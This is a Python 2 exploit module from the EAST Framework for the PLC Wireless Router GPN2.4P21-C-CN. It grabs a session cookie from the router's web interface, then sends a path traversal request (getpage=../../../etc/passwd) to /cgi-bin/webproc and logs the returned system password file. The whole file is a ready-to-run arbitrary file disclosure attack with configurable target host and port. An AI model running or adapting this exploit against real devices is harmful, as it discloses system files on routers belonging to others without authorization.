#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import urllib2

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "ef_plc_wireless_router_GPN2.4P21-C-CN_afd"
INFO['DESCRIPTION'] = "PLC Wireless Router GPN2.4P21-C-CN Arbitrary File Disclosure"
INFO['VENDOR'] = ""
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/40304/']
INFO["CVE Name"] = "0-day"
INFO["NOTES"] = """PLC Wireless Router GPN2.4P21-C-CN Arbitrary File Disclosure. For example this module get /etc/password from router
"""

INFO['CHANGELOG'] = "30 Aug, 2016. Written by Gleg team."
INFO['PATH'] = 'Exploits/Hardware/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = '192.168.1.123'
OPTIONS["PORT"] = 8080

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
    
    def make_url(self, path = ''):
        return 'http://{}:{}{}'.format(self.host, self.port, path)
  
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        url = self.make_url('/cgi-bin/webproc?getpage=html/index.html&errorpage=html/main.html&var:language=en_us&var:menu=setup&var:page=connected&var:retag=1&var:subpage=-')
        url2 = self.make_url('/cgi-bin/webproc?getpage=../../../etc/passwd&var:menu=setup&var:page=connected')
        try:
            fd = urllib2.urlopen(url)
            cookie = fd.headers['set-cookie']
            self.log('Cookie ' + cookie)
            
            request = urllib2.Request(url2)
            request.add_header('Cookie', cookie)
            fd = urllib2.urlopen(request)
            data = '\n' + fd.read()
            
            self.log(data)
            
        except Exception as ex:
            self.log(ex)
            self.finish(False)
            
        self.finish(True)    
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
